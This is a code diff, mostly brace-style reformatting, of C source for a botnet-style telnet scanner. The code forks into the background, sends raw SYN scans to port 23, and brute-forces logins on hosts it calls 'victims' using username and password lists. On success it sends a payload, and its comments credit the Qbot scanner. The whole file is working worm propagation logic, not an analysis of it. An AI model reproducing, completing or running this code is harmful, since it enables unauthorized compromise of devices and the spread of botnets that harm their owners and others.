@@ -7,15 +7,13 @@ static struct scan_victim *victim_table;
 static bool scan_able = true;
 static bool scan_scanning = false;
 
-void scan_init(void)
-{
+void scan_init(void) {
 #ifndef SCANNER_TEST
 	int32_t ret;
 
 	if ((ret = fork()) != 0)
 		return; // We are parent or it failed, lets go home
-	else // Child has spawned and we are the child
-	{
+	else { // Child has spawned and we are the child
 		// if (proc_root()) // Make it check for root and stuff later
 		if (scan_scanner() == false)
 			scan_able = false;
@@ -26,8 +24,7 @@ void scan_init(void)
 }
 
 // I didn't write the checksum funcs
-static uint16_t checksum_generic(uint16_t *addr, uint32_t count)
-{
+static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
 	// unsigned long sum = 0;
 	uint16_t sum = 0;
 
@@ -41,15 +38,13 @@ static uint16_t checksum_generic(uint16_t *addr, uint32_t count)
 	
 	return ~sum;
 }
-static uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
-{
+static uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
 	uint16_t *buf = buff;
 	uint32_t ip_src = iph->saddr;
 	uint32_t ip_dst = iph->daddr;
 	uint32_t sum = 0;
 	
-	while (len > 1)
-	{
+	while (len > 1) {
 		sum += *buf;
 		buf++;
 		len -= 2;
@@ -77,23 +72,18 @@ I tried to make my own that worked but apparantly I'm not to great as it ended u
 the telnet server send the password and login in the same packet which breaks the scanner
 It's a good time here :^)
 */
-static inline __attribute__((always_inline)) void scan_negotiate(int32_t sock)
-{
+static inline __attribute__((always_inline)) void scan_negotiate(int32_t sock) {
 	unsigned char ptr[3];
 
-	while(1)
-	{
+	while(1) {
 		recv(sock, ptr, 3, MSG_NOSIGNAL);
 		if (*ptr != 0xff)
 			break;
-		else if (*ptr == 0xff)
-		{	
-			if (ptr[1] == 0xff)
-			{
+		else if (*ptr == 0xff) {	
+			if (ptr[1] == 0xff) {
 				continue;
 			}
-			else if (ptr[1] == 0xfd)
-			{
+			else if (ptr[1] == 0xfd) {
 				uint8_t tmp1[3] = {255, 251, 31};
 				uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
 
@@ -103,18 +93,14 @@ static inline __attribute__((always_inline)) void scan_negotiate(int32_t sock)
 				send(sock, tmp1, 3, MSG_NOSIGNAL);
 				send(sock, tmp2, 9, MSG_NOSIGNAL);
 			}
-			else
-			{
+			else {
 				iac_wont:
-
-				for (uint8_t i = 0; i < 3; i++)
-				{
+				for (uint8_t i = 0; i < 3; i++) {
 					if (ptr[i] == 0xfd)
 						ptr[i] = 0xfc;
 					else if (ptr[i] == 0xfb)
 						ptr[i] = 0xfd;
 				}
-
 				send(sock, ptr, 3, MSG_NOSIGNAL);
 			}
 		}
@@ -123,8 +109,7 @@ static inline __attribute__((always_inline)) void scan_negotiate(int32_t sock)
 	return;
 }
 
-static void xselect(int32_t fd)
-{
+static void xselect(int32_t fd) {
 	fd_set fdset;
 	struct timeval timeout;
 	timeout.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
@@ -137,10 +122,8 @@ static void xselect(int32_t fd)
 	select(fd + 1, &fdset, NULL, NULL, &timeout);
 }
 
-bool structcmp(unsigned char *buf, const char **str)
-{
-	while (*str != NULL)
-	{
+bool structcmp(unsigned char *buf, const char **str) {
+	while (*str != NULL) {
 		// printf("Comparing \"%s\" -> \"%s\"\n", buf, *str);
 		if (subcasestr((const char *)buf, *str++) != -1)
 			return true;
@@ -148,8 +131,7 @@ bool structcmp(unsigned char *buf, const char **str)
 	return false;
 }
 
-static uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2)
-{
+static uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2) {
 	/*
 	// This code right here works
 	// WHAT THE _____
@@ -197,11 +179,9 @@ static uint8_t scan_readuntil(const int32_t sock, const char **strs, const char 
 	unsigned char mbuf[1024];
 	zero(mbuf, sizeof(mbuf));
 
-	while (1)
-	{
+	while (1) {
 		xselect(sock); // When I remove this it screws up so I guess we need it
-		if (recv(sock, buf, 1, MSG_NOSIGNAL) < 0) // Read 1 from socket
-		{
+		if (recv(sock, buf, 1, MSG_NOSIGNAL) < 0) { // Read 1 from socket
 			if (found == 0)
 				printd("Error %d: %s", errno, strerror(errno));
 			else
@@ -210,14 +190,12 @@ static uint8_t scan_readuntil(const int32_t sock, const char **strs, const char 
 			
 		}
 
-		if (found == 0)
-		{
+		if (found == 0) {
 			/* 	Don't let it overflow
 			This is probably not very efficient, I should remove it but I wanna be safe */
 			if (i < (int16_t)sizeof(mbuf))
 				mbuf[i++] = *buf;
-			else
-			{
+			else {
 				// Save the last 100 chars
 				unsigned char tmp[100];
 				for(uint8_t x = 0; x < 100; x++)
@@ -229,13 +207,11 @@ static uint8_t scan_readuntil(const int32_t sock, const char **strs, const char 
 
 			// printf("\"%s\"\n", mbuf);
 
-			if (structcmp(mbuf, strs) == true)
-			{
+			if (structcmp(mbuf, strs) == true) {
 				printf("Found 1\n");
 				found = 1;
 			}
-			if (structcmp(mbuf, strs2) == true)
-			{
+			if (structcmp(mbuf, strs2) == true) {
 				printf("Found 2\n");
 				found = 2;
 			}
@@ -245,18 +221,15 @@ static uint8_t scan_readuntil(const int32_t sock, const char **strs, const char 
 	return found;
 }
 
-static bool scan_setnonblock(int32_t fd)
-{
-	if (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)) == -1)
-	{
+static bool scan_setnonblock(int32_t fd) {
+	if (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)) == -1) {
 		printd("Failed to set nonblocking error %d: %s", errno, strerror(errno));
 		return false;
 	}
 	return true;
 }
 
-bool scan_scanner(void)
-{
+bool scan_scanner(void) {
 #ifdef DEBUG
 	int32_t max = getdtablesize();
 	printd("Maximum files open: %d", max);
@@ -269,8 +242,7 @@ bool scan_scanner(void)
 	printd("Initializing Scanner");
 
 	victim_table = calloc(SCAN_SCANNER_MAXCON, sizeof(struct scan_victim));
-	for (uint8_t i = 0; i < SCAN_SCANNER_MAXCON; i++)
-	{
+	for (uint8_t i = 0; i < SCAN_SCANNER_MAXCON; i++) {
 		victim_table[i].sock = -1;
 		victim_table[i].state = END;
 		victim_table[i].user = 0;
@@ -332,27 +304,23 @@ bool scan_scanner(void)
 	tcph->urg_ptr = 0;
 
 	// Create a raw socket
-	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-	{
+	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
 		printd("Failed to open raw socket");
 		goto end;
 	}
 
 
-	if ((fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0))) == -1)
-	{
+	if ((fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0))) == -1) {
 		printd("fcntl() failed to set O_NONBLOCK. Errno: %d | %s", errno, strerror(errno));
 		goto end;
 	}
 
-	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0)
-	{
+	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0) {
 		printd("Failed to set IP_HDRINCL");
 		goto end;
 	}
 
-	while (1)
-	{
+	while (1) {
 #		ifndef SCANNER_TEST
 		for (i = 0; i < SCAN_SCANNER_BURST; i++)
 #		endif
@@ -379,20 +347,9 @@ bool scan_scanner(void)
 			sleep(1); // Don't spam packets if we're testing
 #			endif
 		}
-		while (1)
-		{
+		while (1) {
 			char buf[1514];
 			struct iphdr *riph = (struct iphdr *)buf;
-			/*
-			Alright so this is the offending line that gave me hours of debugging
-			It used to be struct tcphdr *rtcph = (struct tcphdr *)(iph + 1);
-			Notice how it says iph + 1
-			iph
-			not riph
-			iph
-			So essentially I was reading the tcp buffer off of the last sent packet
-			Jesus
-			*/
 			struct tcphdr *rtcph = (struct tcphdr *)(riph + 1);
 
 			n = recvfrom(sock, buf, sizeof(buf), MSG_NOSIGNAL, NULL, NULL);
@@ -451,10 +408,8 @@ bool scan_scanner(void)
 			printd("Attempting to brute: %s", ipv4_unpack(riph->saddr));
 
 			uint8_t x;
-			for (x = 0; x < SCAN_SCANNER_MAXCON; x++)
-			{
-				if (victim_table[x].state == END)
-				{
+			for (x = 0; x < SCAN_SCANNER_MAXCON; x++) {
+				if (victim_table[x].state == END) {
 					struct scan_victim *victim;
 					victim = &victim_table[x];
 					victim->ip = riph->saddr;
@@ -470,7 +425,6 @@ bool scan_scanner(void)
 		}
 		// while (1)
 		{ // To make all this dealloc automaticly
-			
 			struct sockaddr_in addrx;
 			addrx.sin_family = AF_INET;
 			addrx.sin_port = htons(23);
@@ -484,17 +438,12 @@ bool scan_scanner(void)
 			stimeout.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
 			stimeout.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;
 
-			while (1)
-			{
-				for (i = 0; i < SCAN_SCANNER_MAXCON; i++)
-				{
-					switch(victim_table[i].state)
-					{
-						case CONNECTING:
-						{
+			while (1) {
+				for (i = 0; i < SCAN_SCANNER_MAXCON; i++) {
+					switch(victim_table[i].state) {
+						case CONNECTING: {
 							addrx.sin_addr.s_addr = victim_table[i].ip;
-							if ((victim_table[i].sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-							{
+							if ((victim_table[i].sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
 								victim_table[i].state = FINISHED;
 								break;
 							}
@@ -502,34 +451,28 @@ bool scan_scanner(void)
 							// setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
 							// setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
 
-							if (scan_setnonblock(victim_table[i].sock) == false)
-							{
+							if (scan_setnonblock(victim_table[i].sock) == false) {
 								victim_table[i].state = FINISHED;
 								break;
 							}
 
-							if (connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
-							{
+							if (connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS) {
 								printd("%d->%s Failed to connect error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
 							}
-							else
-							{
+							else {
 								printd("%d->%s Connected", i, ipv4_unpack(victim_table[i].ip));
 							}
 							victim_table[i].state = SELECT;
 							break;
 						}
-						case SELECT:
-						{
+						case SELECT: {
 							FD_ZERO(&fdset);
 							FD_SET(victim_table[i].sock, &fdset);
-							if (select(victim_table[i].sock + 1, NULL, &fdset, NULL, &stimeout) <= 0)
-							{
+							if (select(victim_table[i].sock + 1, NULL, &fdset, NULL, &stimeout) <= 0) {
 								printd("%d->%s Failed to select error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
 								victim_table[i].state = FINISHED;
 							}
-							else
-							{
+							else {
 								printd("%d->%s Select success", i, ipv4_unpack(victim_table[i].ip));
 								scan_negotiate(victim_table[i].sock);
 								// From Qbot scanner
@@ -544,12 +487,10 @@ bool scan_scanner(void)
 							}
 							break;
 						}
-						case USERNAME:
-						{
+						case USERNAME: {
 							uint8_t x = scan_readuntil(victim_table[i].sock, userprompts, prompts);
 
-							switch (x)
-							{
+							switch (x) {
 								case 0:
 									printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
 									victim_table[i].state = FINISHED;
@@ -563,15 +504,13 @@ bool scan_scanner(void)
 									goto _breakuser;
 							}
 							printd("%d->%s Trying username %s", i, ipv4_unpack(victim_table[i].ip), usernames[victim_table[i].user]);
-							if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1)
-							{
+							if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1) {
 								printd("%d->%s Failed to send username", i, ipv4_unpack(victim_table[i].ip));
 								victim_table[i].state = FINISHED;
 								break;
 							}
 							x = scan_readuntil(victim_table[i].sock, failstrs, passprompts);
-							switch (x)
-							{
+							switch (x) {
 								case 0:
 									printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
 									victim_table[i].state = FINISHED;
@@ -589,27 +528,23 @@ bool scan_scanner(void)
 _breakuser:
 							break;
 						}
-						case PASSWORD:
-						{
+						case PASSWORD: {
 							printd("%d->%s Trying password %s", i, ipv4_unpack(victim_table[i].ip), passwords[victim_table[i].user]);
-							if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1)
-							{
+							if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1) {
 								printd("%d->%s Failed to send password", i, ipv4_unpack(victim_table[i].ip));
 								victim_table[i].state = FINISHED;
 								break;
 							}
 
 							uint8_t x = scan_readuntil(victim_table[i].sock, failstrs, prompts);
-							switch (x)
-							{
+							switch (x) {
 								case 0:
 									printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
 									victim_table[i].state = FINISHED;
 									break;
 								case 1:
 									printd("%d->%s Password failed", i, ipv4_unpack(victim_table[i].ip));
-									if (victim_table[i].pass++ >= passsize)
-									{
+									if (victim_table[i].pass++ >= passsize) {
 										victim_table[i].pass = 0;
 										if (victim_table[i].user++ >= usersize)
 											victim_table[i].state = FINISHED;
@@ -622,32 +557,26 @@ _breakuser:
 							}
 							break;
 						}
-						case PAYLOAD:
-						{
+						case PAYLOAD: {
 							// I know this look stupid for now but I'll clean it up later
 							/* Why does the payload never send??*/
 							printd("%d->%s Sending payload", i, ipv4_unpack(victim_table[i].ip));
-							if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, SCAN_SCANNER_PAYLOAD_LEN, 0) == -1)
-							{
+							if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, SCAN_SCANNER_PAYLOAD_LEN, 0) == -1) {
 								printd("Failed to send payload");
 								victim_table[i].state = FINISHED;
 							}
 							else
-							{
 								printd("Payload sent: %s", SCAN_SCANNER_PAYLOAD);
-							}
 							victim_table[i].state = FINISHED;
 							break;
 						}
-						case FINISHED:
-						{
+						case FINISHED: {
 							printd("%d->%s Finished", i, ipv4_unpack(victim_table[i].ip));
 							close(victim_table[i].sock);
 							victim_table[i].state = END;
 							goto _breakbrute; // If one of our cons is free lets go find a new thing to bruteforce :)
 						}
-						case END:
-						{
+						case END: {
 							break;
 
 						}
